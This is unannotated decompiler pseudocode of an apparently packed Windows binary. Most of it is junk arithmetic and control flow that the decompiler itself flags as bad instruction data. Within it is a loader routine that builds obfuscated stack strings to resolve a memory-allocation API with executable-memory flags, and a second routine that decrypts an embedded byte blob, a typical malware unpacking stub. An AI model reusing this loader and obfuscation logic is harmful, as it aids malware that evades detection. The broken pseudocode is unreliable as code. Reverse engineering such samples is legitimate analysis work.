    uRam1d8960f1 = in(0x9c);
    *puVar18 = uRam1d8960f1;
    *(char *)puVar18 = (char)((uint)iVar19 >> 8);
    *(uint *)(iVar19 + -0x43) = *(uint *)(iVar19 + -0x43) ^ uVar16;
LAB_00403299:
    uVar24 = uVar5 | 0x6c;
    uVar16 = 0x12d5;
    iVar6 = 0x1b3b;
  } while( true );
}



// WARNING: Control flow encountered bad instruction data
// WARNING: Instruction at (ram,0x004032f4) overlaps instruction at (ram,0x004032f3)
// 
// WARNING: Removing unreachable block (ram,0x004032b5)
// WARNING: Removing unreachable block (ram,0x00403244)
// WARNING: Removing unreachable block (ram,0x0040321f)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined8 FUN_00403179(void)

{
  code *pcVar1;
  byte bVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  uint extraout_ECX;
  int extraout_EDX;
  int unaff_EBP;
  uint uVar6;
  int iVar7;
  int iVar8;
  undefined4 *puVar9;
  byte in_AF;
  bool bVar10;
  undefined8 uVar11;
  undefined4 uVar12;
  undefined4 uVar13;
  undefined4 uVar14;
  undefined4 uVar15;
  undefined4 uVar16;
  undefined4 uVar17;
  undefined4 uVar18;
  undefined4 uVar19;
  undefined4 uVar20;
  undefined4 uVar21;
  undefined4 uVar22;
  undefined4 uVar23;
  undefined4 uVar24;
  undefined4 uVar25;
  undefined4 uVar26;
  undefined4 uVar27;
  undefined4 uVar28;
  undefined4 uVar29;
  undefined4 uVar30;
  
  uVar30 = 0x54;
  uVar29 = 0x17;
  uVar28 = 0x59;
  uVar27 = 0x58;
  uVar26 = 0x11;
  uVar25 = 0x7f;
  uVar24 = 0x6d;
  uVar23 = 0x1d;
  uVar22 = 0x5f;
  uVar21 = 0x7e;
  uVar20 = 0;
  uVar19 = 0;
  uVar18 = 0;
  uVar17 = 0;
  uVar16 = 0;
  uVar15 = 0;
  uVar14 = 0;
  uVar13 = 0;
  uVar12 = 0;
  _DAT_0040c3d5 = 0;
  _DAT_0040cb01 = 0;
  FUN_00403179();
  _DAT_0040c263 = 0x106c;
  _DAT_0040c076 = 0xa000006b;
  if ((_DAT_0040cdf9 & 0xa000006b) == 0) {
    _DAT_0040c076 = 0x3851;
  }
  _DAT_0040c076 = _DAT_0040c076 | 0xc8c;
  if (_DAT_0040c076 != 0) {
    _DAT_0040c076 = (_DAT_0040c076 >> 4 & 0xfff) + _DAT_0040c9b1;
  }
  _DAT_0040ca34 = _DAT_0040c076;
  uVar11 = FUN_004031c2();
  iVar3 = (int)((ulonglong)uVar11 >> 0x20);
                    // WARNING: Bad instruction - Truncating control flow here
  uVar4 = 0xa9d;
  iVar7 = 0x15cb;
  uVar6 = 0x1e7d;
  _DAT_0040c287 = (char *)0x1937;
  bVar10 = (_DAT_0040c09f & 0x1937) == 0;
  if (bVar10) {
    _DAT_0040c287 = &DAT_80000c9b;
  }
  if ((POPCOUNT(_DAT_0040c09f & 0x37) & 1U) == 0) {
    DAT_01000a84 = (DAT_01000a84 + '\x17') - bVar10;
    *_DAT_0040c287 = *_DAT_0040c287 + '\n';
    do {
      iVar8 = iVar7 + -0xda6;
      if (iVar8 == 0) {
        uVar6 = 0x791;
        iVar8 = iVar7 + -0x615;
      }
      puVar9 = (undefined4 *)(iVar8 << 1 | (uint)(iVar8 < 0));
      _DAT_0040c964 = _DAT_0040c964 - (int)puVar9;
      uVar5 = uVar4 - 1;
      pcVar1 = (code *)swi(4);
      if (SBORROW4(uVar4,1) == true) {
        (*pcVar1)(uVar12,uVar13,uVar14,uVar15,uVar16,uVar17,uVar18,uVar19,uVar20,uVar21,uVar22,
                  uVar23,uVar24,uVar25,uVar26,uVar27,uVar28,uVar29,uVar30);
        uVar5 = extraout_ECX;
        iVar3 = extraout_EDX;
      }
      uRam1d8960f1 = in(0x9c);
      *puVar9 = uRam1d8960f1;
      *(char *)puVar9 = (char)((uint)iVar3 >> 8);
      *(uint *)(iVar3 + -0x43) = *(uint *)(iVar3 + -0x43) ^ uVar6;
      uVar4 = uVar5 | 0x6c;
      uVar6 = 0x12d5;
      iVar7 = 0x1b3b - _DAT_0040c7df;
    } while( true );
  }
  iVar3 = 0x61443b30 - (uint)bVar10;
  in_AF = 9 < ((byte)iVar3 & 0xf) | in_AF;
  bVar2 = (byte)iVar3 + in_AF * -6;
  if (iVar3 < 0) {
    _DAT_000015ff = _DAT_000015ff + unaff_EBP;
                    // WARNING: Bad instruction - Truncating control flow here
    halt_baddata();
  }
  return CONCAT44(CONCAT31((int3)((ulonglong)uVar11 >> 0x28),0x99),
                  CONCAT31((int3)((uint)iVar3 >> 8),
                           bVar2 + (0x9f < bVar2 | in_AF * (bVar2 < 6) | 1) * -0x60));
}



// WARNING: Control flow encountered bad instruction data
// WARNING: Instruction at (ram,0x004032f4) overlaps instruction at (ram,0x004032f3)
// 
// WARNING: Removing unreachable block (ram,0x004032b5)
// WARNING: Removing unreachable block (ram,0x00403244)
// WARNING: Removing unreachable block (ram,0x0040321f)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined8 FUN_004031c2(void)

{
  code *pcVar1;
  byte bVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  uint extraout_ECX;
  int extraout_EDX;
  int unaff_EBP;
  uint uVar6;
  uint unaff_EDI;
  int iVar7;
  int iVar8;
  undefined4 *puVar9;
  byte in_AF;
  bool bVar10;
  undefined8 uVar11;
  
  _DAT_0040c263 = unaff_EDI | 0x106c;
  _DAT_0040c076 = 0xa000006b;
  if ((_DAT_0040cdf9 & 0xa000006b) == 0) {
    _DAT_0040c076 = 0x3851;
  }
  _DAT_0040c076 = _DAT_0040c076 | 0xc8c;
  if (_DAT_0040c076 != 0) {
    _DAT_0040c076 = (_DAT_0040c076 >> 4 & 0xfff) + _DAT_0040c9b1;
  }
  _DAT_0040ca34 = _DAT_0040c076;
  uVar11 = FUN_004031c2();
  iVar3 = (int)((ulonglong)uVar11 >> 0x20);
                    // WARNING: Bad instruction - Truncating control flow here
  uVar4 = 0xa9d;
  iVar7 = 0x15cb;
  uVar6 = 0x1e7d;
  _DAT_0040c287 = (char *)0x1937;
  bVar10 = (_DAT_0040c09f & 0x1937) == 0;
  if (bVar10) {
    _DAT_0040c287 = &DAT_80000c9b;
  }
  if ((POPCOUNT(_DAT_0040c09f & 0x37) & 1U) == 0) {
    DAT_01000a84 = (DAT_01000a84 + '\x17') - bVar10;
    *_DAT_0040c287 = *_DAT_0040c287 + '\n';
    do {
      iVar8 = iVar7 + -0xda6;
      if (iVar8 == 0) {
        uVar6 = 0x791;
        iVar8 = iVar7 + -0x615;
      }
      puVar9 = (undefined4 *)(iVar8 << 1 | (uint)(iVar8 < 0));
      _DAT_0040c964 = _DAT_0040c964 - (int)puVar9;
      uVar5 = uVar4 - 1;
      pcVar1 = (code *)swi(4);
      if (SBORROW4(uVar4,1) == true) {
        (*pcVar1)();
        uVar5 = extraout_ECX;
        iVar3 = extraout_EDX;
      }
      uRam1d8960f1 = in(0x9c);
      *puVar9 = uRam1d8960f1;
      *(char *)puVar9 = (char)((uint)iVar3 >> 8);
      *(uint *)(iVar3 + -0x43) = *(uint *)(iVar3 + -0x43) ^ uVar6;
      uVar4 = uVar5 | 0x6c;
      uVar6 = 0x12d5;
      iVar7 = 0x1b3b - _DAT_0040c7df;
    } while( true );
  }
  iVar3 = 0x61443b30 - (uint)bVar10;
  in_AF = 9 < ((byte)iVar3 & 0xf) | in_AF;
  bVar2 = (byte)iVar3 + in_AF * -6;
  if (iVar3 < 0) {
    _DAT_000015ff = _DAT_000015ff + unaff_EBP;
                    // WARNING: Bad instruction - Truncating control flow here
    halt_baddata();
  }
  return CONCAT44(CONCAT31((int3)((ulonglong)uVar11 >> 0x28),0x99),
                  CONCAT31((int3)((uint)iVar3 >> 8),
                           bVar2 + (0x9f < bVar2 | in_AF * (bVar2 < 6) | 1) * -0x60));
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_00403323(undefined4 param_1)

{
  uint uVar1;
  int iVar2;
  int unaff_EDI;
  
  uVar1 = _DAT_0040c0cd | 0xc33;
  if (uVar1 == 0) {
    uVar1 = 0xffffc353;
  }
  iVar2 = uVar1 * 4 + -0x4b2;
  if (iVar2 == 0) {
    iVar2 = 0;
  }
  _DAT_0040c310 = iVar2 << 1 | (uint)(iVar2 < 0);
  _DAT_0040c59d = _DAT_0040c59d - _DAT_0040c310;
  return CONCAT31(0x12,unaff_EDI == 0x237);
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

uint FUN_0040338f(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined param_4,
                 undefined param_5,undefined param_6,undefined param_7,undefined param_8,
                 undefined param_9,undefined param_10,undefined1 param_11)

{
  uint uVar1;
  int unaff_EBX;
  uint uVar2;
  
  _DAT_0040c907 = 0x134d4;
  uVar1 = unaff_EBX + 1;
  if ((uVar1 & 0x10c0) != 0) {
    uVar1 = (uVar1 >> 1 | (uint)((uVar1 & 1) != 0) << 0x1f) - 0x9c7;
  }
  uVar1 = uVar1 + 0x120;
  uVar2 = uVar1 & 0xffffff | _DAT_0040c664;
  if (uVar2 == 0) {
    uVar1 = _DAT_0040c036 ^ 0x1cde;
    uVar2 = _DAT_0040c036;
  }
  s_8_1_8__0040c1c1._0_4_ = s_8_1_8__0040c1c1._0_4_ - uVar2;
  return uVar1;
}



// WARNING: Removing unreachable block (ram,0x00403591)
// WARNING: Removing unreachable block (ram,0x0040354b)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00403526(undefined4 param_1)

{
  _DAT_0040c5f2 = 0x10b;
  _DAT_0040cc18 = ((int)&stack0xfffffffc * 2 + 0xed5) * 0x20 | 0x1aa5;
  if (_DAT_0040cc18 != 0) {
    _DAT_0040cc18 = 0x1391f;
  }
  return;
}



// WARNING: Removing unreachable block (ram,0x00403674)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

ulonglong __fastcall
FUN_00403644(undefined4 param_1,undefined4 param_2,undefined param_3,undefined4 param_4)

{
  _DAT_0040c752 = 0x15b8;
  return CONCAT44(param_2,0x183) ^ 0x100d;
}



// WARNING: Removing unreachable block (ram,0x00403736)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_004036b6(int param_1,int param_2)

{
  uint uVar1;
  undefined4 uVar2;
  int unaff_retaddr;
  
  uVar1 = unaff_retaddr + 0x9fb;
  if ((_DAT_0040c414 & uVar1) != 0) {
    uVar1 = uVar1 >> 1;
  }
  s_h___H__0040cbce[0] = (char)uVar1;
  s_h___H__0040cbce[1] = (char)(uVar1 >> 8);
  s_h___H__0040cbce[2] = (char)(uVar1 >> 0x10);
  s_h___H__0040cbce[3] = (char)(uVar1 >> 0x18);
  uVar1 = param_1 + 1U | 0x1fab;
  if (uVar1 == 0) {
    uVar1 = 0x581;
  }
  _DAT_0040ca3e = _DAT_0040ca3e - uVar1;
  uVar2 = 0x21df;
  uVar1 = param_2 - 0x127e;
  if ((uVar1 & 0x31c) != 0) {
    uVar2 = 0x1053;
    uVar1 = (uVar1 >> 1) - _DAT_0040c7ca | 0x1053;
  }
  _DAT_0040c28f = 0xffffed82;
  _DAT_0040c229 = uVar1 + 0x1ac;
  _DAT_0040c5ad = 0;
  _DAT_0040c11c = uVar1 + 0x1ac;
  return uVar2;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00403833(undefined4 param_1,undefined4 param_2)

{
  int iVar1;
  int iVar2;
  
  _DAT_0040c780 = 0;
  _DAT_0040cb4f = 0;
  iVar1 = 0x400c8;
  if ((_DAT_0040c98a & 0x400c8) != 0) {
    iVar1 = 0x4004f;
  }
  iVar2 = iVar1 + _DAT_0040c0f1 + -0x2e4;
  if (iVar2 != 0) {
    iVar2 = iVar1 + _DAT_0040c0f1 + -0x2e5;
  }
  _DAT_0040ccf1 = _DAT_0040ccf1 + iVar2;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00403909(int param_1)

{
  uint uVar1;
  
  uVar1 = _DAT_0040c253 | 0x7d49;
  if (uVar1 == 0) {
    uVar1 = _DAT_0040ca0a - 1U >> 1;
  }
  _DAT_0040c78f = _DAT_0040c78f - uVar1;
  _DAT_0040c174 = _DAT_0040cbb1 + 0x790;
  uVar1 = -param_1 | _DAT_0040c87f;
  if (uVar1 != 0) {
    uVar1 = (uVar1 | 0x1107) - _DAT_0040cd6d;
  }
  uVar1 = uVar1 - (_DAT_0040cbb1 + 0x790);
  if ((uVar1 & 0x108) == 0) {
    uVar1 = uVar1 + 1 | 0xe14;
  }
  uVar1 = uVar1 * 0x80;
  if (uVar1 != 0x7c3) {
    uVar1 = (uVar1 - 0x828) * 0x20 | uVar1 - 0x828 >> 0x1b;
  }
  _DAT_0040c872 = _DAT_0040c872 - uVar1;
  _DAT_0040ccfc = 0xffffff81;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_004039d6(undefined param_1,undefined param_2,int param_3,undefined4 param_4)

{
  _DAT_0040cdb5 = 0x85b6e;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __thiscall FUN_00403a4c(void *this,int param_1)

{
  uint uVar1;
  
  uVar1 = 0xfffff496;
  if ((_DAT_0040c4e0 & 0xfffff496) == 0) {
    uVar1 = _DAT_0040c7e4 - 0xf29;
  }
  _DAT_0040c650 = 0x322;
  _DAT_0040c62c = _DAT_0040c62c - uVar1;
  _DAT_0040cd6a = 0xbf9 - _DAT_0040c90e;
  if (_DAT_0040cd6a == 0) {
    _DAT_0040cd6a = 0;
  }
  uVar1 = (uVar1 | 0xeb2) + 0x607 | 0x1a86;
  if (uVar1 == 0) {
    uVar1 = param_1 - 0xd38;
  }
  return CONCAT31((int3)(uVar1 >> 8),this == (void *)0x1fb);
}



// WARNING: Removing unreachable block (ram,0x00403bce)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

bool FUN_00403b85(undefined4 param_1)

{
  int in_EAX;
  uint uVar1;
  int unaff_EBX;
  
  _DAT_0040ce0e = _DAT_0040ce0e - (in_EAX - _DAT_0040c48d);
  uVar1 = _DAT_0040c423 | 0x213d;
  if (uVar1 != 0) {
    uVar1 = uVar1 - 1;
  }
  _DAT_0040c5da = uVar1 + 1;
  _DAT_0040cc75 = 0xbf5f;
  _DAT_0040c4a1 = 0x16c;
  _DAT_0040c29b = _DAT_0040c29b + -0xbf5f;
  return unaff_EBX - _DAT_0040c590 == 0x373;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00403c11(void)

{
  int unaff_EBX;
  uint uVar1;
  int unaff_EDI;
  
  _DAT_0040cbe6 = _DAT_0040c10c + 0xc5fU | 0x11ad;
  if (_DAT_0040cbe6 != 0) {
    _DAT_0040cbe6 = _DAT_0040cbe6 + 0x20c2;
  }
  _DAT_0040c3ca = unaff_EDI + unaff_EBX * 8 + 0x2402;
  ram0x0040c72e = ram0x0040c72e - (_DAT_0040c3ca - _DAT_0040cdd3);
  uVar1 = 0xffffe8dd;
  if ((_DAT_0040cbb2 & 0xffffe8dd) != 0) {
    uVar1 = _DAT_0040c658 - 0x1723U & 0xfff;
  }
  _DAT_0040c370 = _DAT_0040c370 - uVar1;
  _DAT_0040cdd9 = 0x1baac;
  uVar1 = (uint)-_DAT_0040c983 >> 4 | _DAT_0040c983 * -0x10000000;
  _DAT_0040c1e5 = uVar1 - 0x4cf;
  if (_DAT_0040c1e5 != 0) {
    uVar1 = (uVar1 - 0x4ce) + _DAT_0040c5a6;
    _DAT_0040c1e5 = uVar1 >> 1 | (uint)((uVar1 & 1) != 0) << 0x1f;
  }
  _DAT_0040c1e5 = _DAT_0040c1e5 - _DAT_0040cbf4;
  if ((_DAT_0040c1e5 & 0xdad) == 0) {
    _DAT_0040c1e5 = _DAT_0040c1e5 - 0x6b9;
  }
  return;
}



// WARNING: Removing unreachable block (ram,0x00404186)
// WARNING: Removing unreachable block (ram,0x00403f6f)
// WARNING: Removing unreachable block (ram,0x004040bb)
// WARNING: Removing unreachable block (ram,0x004042a5)
// WARNING: Removing unreachable block (ram,0x004040de)
// WARNING: Removing unreachable block (ram,0x00403fbc)
// WARNING: Removing unreachable block (ram,0x00404160)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00403f04(undefined param_1,undefined param_2,undefined param_3,undefined param_4,
                 undefined param_5,undefined param_6,undefined param_7,undefined param_8,
                 undefined param_9,undefined param_10,undefined1 param_11)

{
  uint in_EAX;
  HMODULE hModule;
  FARPROC pFVar1;
  int iVar2;
  uint uVar3;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  uint local_8;
  
  uStack_c = 0;
  uVar3 = in_EAX | 0x177a;
  if ((local_8 & uVar3) == 0) {
    uVar3 = uVar3 + 0x277;
  }
  uVar3 = uVar3 | 0x416;
  if ((local_8 & uVar3) != 0) {
    uVar3 = uVar3 << 1;
  }
  _DAT_0040c22a = _DAT_0040c22a + uVar3;
  uStack_10 = 0x32334c65;
  _DAT_0040ca99 = _DAT_0040ca99 + 0x1c48;
  uStack_14 = 0x4e72654b;
  _DAT_0040c9b9 = 1;
  local_8 = 0xae;
  hModule = LoadLibraryA((LPCSTR)&uStack_14);
  uStack_c = 0x7845;
  uVar3 = _DAT_0040c5d1 + 0x1fa0;
  if ((0xcb3U - _DAT_0040c548 >> 7 | (0xcb3U - _DAT_0040c548) * 0x2000000 | uVar3) != 0) {
    uVar3 = (uVar3 * 2 | (uint)((int)uVar3 < 0)) - 0xbb0;
  }
  _DAT_0040c4fb = _DAT_0040c4fb - uVar3;
  uStack_10 = 0x636f6c6c;
  uVar3 = 0x131e19 - _DAT_0040c48d;
  if ((ram0x0040c968 & uVar3) == 0) {
    uVar3 = uVar3 >> 4 | uVar3 * 0x10000000;
  }
  _DAT_0040c613 = _DAT_0040c613 - uVar3;
  uStack_14 = 0x416c6175;
  _DAT_0040c11c = &stack0x00983316;
  _DAT_0040cd73 = _DAT_0040c11c + _DAT_0040c3d6 + (int)_DAT_0040cd73;
  _DAT_0040c52c = 0x481;
  uRam0040c503._0_3_ =
       (undefined3)((uint)(CONCAT31((undefined3)uRam0040c503,DAT_0040c502) + 0x481) >> 8);
  local_8 = 0xc3354;
  _DAT_0040c0de = _DAT_0040c0de + -0xcec;
  _DAT_0040c4ff = (uint)hModule | 0xcc6;
  _DAT_0040c1d1 = _DAT_0040c1d1 + _DAT_0040c4ff;
  _DAT_0040ca1b = _DAT_0040ca1b - (-0x47fff632 - _DAT_0040cb0c);
  iVar2 = -0xb8a;
  if ((_DAT_0040c5f6 & 0xfffff476) == 0) {
    iVar2 = -0xb89;
  }
  _DAT_0040cc37 = _DAT_0040cc37 + iVar2;
  _DAT_0040c18c = _DAT_0040c18c + -0x27c;
  pFVar1 = GetProcAddress(hModule,&stack0xffffffe8);
  _DAT_0040cc8d = _DAT_0040cc8d + 0x1531;
  _DAT_0040c8c4 = 0x673c;
  uStack_c = 0x40;
  _DAT_0040c31b = 0x12db;
  _DAT_0040c6bf = _DAT_0040c6bf + -0x12db;
  uStack_10 = 0x3000;
  _DAT_0040c00c = _DAT_0040c00c + 0x647a;
  uStack_14 = 0x509a6;
  iVar2 = ((uint)pFVar1 >> 1) + 0x6fe;
  if (iVar2 != 0) {
    iVar2 = ((uint)pFVar1 >> 1) + 0x54c;
  }
  uVar3 = (iVar2 - _DAT_0040c65f) * 2 | _DAT_0040cc11;
  if (uVar3 == 0) {
    uVar3 = 0x11e82;
  }
  _DAT_0040c387 = _DAT_0040c387 - uVar3;
  DAT_0040c8de = 0xffffffff;
  _DAT_0040c6c7 = -_DAT_0040cd57;
  _DAT_0040cd9f = 0x1688;
  local_8 = 0x1688;
  _DAT_0040cc17 = _DAT_0040c6c7;
  iVar2 = (*pFVar1)();
  _DAT_0040ca51 = 0x2460;
  _DAT_0040cd90 = _DAT_0040cd90 + 0x2460;
  _DAT_0040cbbe = iVar2 + 0xb8U >> 2;
  return;
}



// WARNING: Removing unreachable block (ram,0x00404490)
// WARNING: Removing unreachable block (ram,0x004043e6)
// WARNING: Removing unreachable block (ram,0x00404752)
// WARNING: Removing unreachable block (ram,0x00404404)
// WARNING: Removing unreachable block (ram,0x0040482c)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __fastcall FUN_00404375(int param_1)

{
  byte *pbVar1;
  byte bVar2;
  byte bVar3;
  byte bVar5;
  undefined4 uVar4;
  int iVar6;
  uint uVar7;
  uint uVar8;
  byte *unaff_EBX;
  int iVar9;
  byte *pbVar10;
  uint local_58;
  uint local_18;
  
  _DAT_0040c31b = param_1 + 0x1465;
  _DAT_0040c8c2 = param_1 + 0x14ee + _DAT_0040c5f4;
  _DAT_0040c2be = _DAT_0040c2be + _DAT_0040c8c2;
  _DAT_0040cb66 = 0xfffffabc;
  if ((_DAT_0040c699 & 0xfffffabc) != 0) {
    _DAT_0040cb66 = 0x4aa;
  }
  iVar6 = _DAT_0040c8c2;
  if ((local_58 | 0x3461) != 0) {
    iVar6 = 0x2593;
  }
  _DAT_0040c348 = 0x7f380;
  _DAT_0040c1c9 = 0x7f380;
  uVar7 = iVar6 + 0x18c;
  if (uVar7 == 0) {
    uVar7 = iVar6 + 0x18d;
  }
  uVar8 = uVar7 & 0xfffffff;
  if ((uVar7 & 0x24d4) != 0) {
    uVar8 = uVar8 - 0xccd >> 1;
  }
  _DAT_0040c718 = _DAT_0040c718 + uVar8;
  _DAT_0040c661 = CONCAT13(0xc4,_DAT_0040c661);
  uRam0040c665 = CONCAT13(uRam0040c665._3_1_,0xfffff2);
  _DAT_0040c944 = 0xfffff74c;
  uVar4 = 0x147327bd;
  pbVar10 = &DAT_0040ce23;
  do {
    uVar7 = (int)(unaff_EBX + 0x8f) * 0x100 | (uint)(unaff_EBX + 0x8f) >> 0x18;
    uVar8 = uVar7 | 0x106f;
    if (uVar8 != 0) {
      uVar8 = uVar7 | 0x177f;
    }
    if ((uVar8 & 0xcd) != 0) {
      uVar8 = (uVar8 >> 3 | uVar8 << 0x1d) + _DAT_0040cbd9;
    }
    _DAT_0040c2db = _DAT_0040c2db - uVar8;
    _DAT_0040ccf7 = 0xfffffa16;
    _DAT_0040c3ec = _DAT_0040c3ec + -0x5ea;
    pbVar1 = pbVar10 + 1;
    uVar7 = (uint)uVar4 >> 8;
    bVar5 = (byte)((uint)uVar4 >> 8);
    bVar2 = ((((*pbVar10 >> 2 | *pbVar10 << 6) ^ 0x94) - bVar5 ^ bVar5) - bVar5 ^ bVar5) + bVar5 ^
            bVar5;
    bVar3 = (bVar2 ^ 0xf8) >> 2;
    bVar2 = ((byte)(bVar3 | bVar2 << 6) >> 2 | bVar3 << 6) ^ bVar5;
    bVar3 = bVar2 >> 3;
    bVar2 = bVar3 | bVar2 << 5;
    bVar3 = (((bVar2 >> 3 | bVar3 << 5) + bVar5 ^ 0x11) - 0xd ^ bVar5) + 0x52;
    bVar3 = bVar3 >> 3 | bVar3 * ' ';
    uVar4 = CONCAT22((short)((uint)uVar4 >> 0x10),CONCAT11(bVar5 - 0x3f,bVar3));
    uVar8 = 0xb50U - _DAT_0040c269 & 0xf | _DAT_0040cce1;
    if (uVar8 != 0) {
      uVar8 = uVar8 + 1;
    }
    _DAT_0040c416 = _DAT_0040c416 + uVar8;
    *unaff_EBX = bVar3;
    iVar6 = 0x6ee;
    local_18 = local_18 | 0x6ee;
    if (local_18 != 0) {
      iVar6 = 0x6ef;
    }
    _DAT_0040c572 = _DAT_0040c572 + iVar6;
    uVar8 = (int)pbVar1 * 0x100;
    if ((CONCAT31((int3)uVar7,bVar2) | uVar8) != 0) {
      uVar8 = 0x57930;
    }
    uVar7 = uVar8 ^ 0x540;
    iVar6 = uVar8 - 0xca1;
    if (iVar6 != 0) {
      iVar6 = uVar8 - 0xca0;
    }
    _DAT_0040cb60 = _DAT_0040cb60 + iVar6;
    pbVar10 = pbVar1;
    unaff_EBX = unaff_EBX + 1;
  } while (pbVar1 != &DAT_0040d8cd);
  if ((_DAT_0040c9b9 & uVar7) != 0) {
    uVar7 = uVar7 - 1;
  }
  iVar6 = 0x3b5;
  iVar9 = (uVar7 - 0x3b5 >> 6 | (uVar7 - 0x3b5) * 0x4000000) - 0x74f;
  if (iVar9 == 0) {
    iVar6 = 0xd65;
    iVar9 = 0x10e6d;
  }
  _DAT_0040c382 = iVar9 - 0xc4bU | _DAT_0040c661;
  if (_DAT_0040c382 == 0) {
    _DAT_0040c382 = _DAT_0040cc37;
  }
  _DAT_0040c5d8 = _DAT_0040c382;
  uVar7 = ((uint)(&stack0x00001394 + _DAT_0040c164 + iVar6) | 0x1752) - 0xbd7;
  if (uVar7 == 0) {
    uVar7 = ((uint)(&stack0x00001394 + _DAT_0040c164 + iVar6) | 0x1752) - 0x1636 | 0x183a;
  }
  _DAT_0040c94c = _DAT_0040c94c - (uVar7 - 1);
  uVar7 = _DAT_0040c7c6 + 0x4d7U >> 1;
  uVar8 = uVar7 + 0xeff;
  if (uVar8 == 0) {
    uVar8 = uVar7 + 0xf00;
  }
  uVar8 = uVar8 | _DAT_0040c70e;
  if (uVar8 != 0) {
    uVar8 = uVar8 + 0x1098 >> 1;
  }
  _DAT_0040c07b = _DAT_0040c07b - uVar8;
  return;
}


